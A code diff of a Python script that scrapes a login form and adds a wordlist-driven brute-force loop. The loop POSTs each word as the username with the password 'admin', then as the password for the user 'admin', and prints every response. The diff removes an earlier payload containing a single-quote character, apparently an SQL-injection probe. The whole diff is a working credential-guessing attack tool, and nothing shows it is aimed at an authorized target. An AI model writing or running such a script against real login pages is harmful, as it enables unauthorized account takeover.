@@ -7,6 +7,7 @@ import random
 import time
 import requests 
 from bs4 import BeautifulSoup
+import urllib.parse
 from urllib.parse import urljoin
 from urllib.parse import urlencode
 
@@ -26,27 +27,22 @@ def cypher():
   post_url = urljoin(url, action)
   print("This is the post URL: ", post_url)
   
-  payload = {}
-  temp_payload = {'jack': 4098}
-  inputvalue_admin = "admin"
-  inputvalue_2 = "'"
+  c = [("admin", "admin")]
 
-  for input_tag in form.find_all("input"):
-      name = input_tag.get("name")
-      value = input_tag.get("value", "admin")
-      if name:
-          payload[name] = value
+  with open("wordlist.txt") as f:
+      for word in f:
+          for u, p in c:
+              formatted = f'{{"username":"{word.strip()}","password":"{p}"}}'
+              post_response = session.post(post_url, data=formatted, timeout=60)
+              print(post_response.status_code)
+              print(post_response.text, "with:", urllib.parse.quote_plus(formatted))
+              time.sleep(1)
+              formatted = f'{{"username":"{u}","password":"{word.strip()}"}}'
+              post_response = session.post(post_url, data=formatted, timeout=60)
+              print(post_response.status_code)
+              print(post_response.text, "with:", formatted)
+              time.sleep(1)
 
-# add wordlist logic
-
-  print(payload)
-  post_response = session.post(post_url, data=payload, timeout=60)
-
-#  print(payload)
-
-  post_response = session.post(post_url, data=payload, timeout=60)
-  print(post_response.status_code)
-  print(post_response.text)
 
 def main():
 
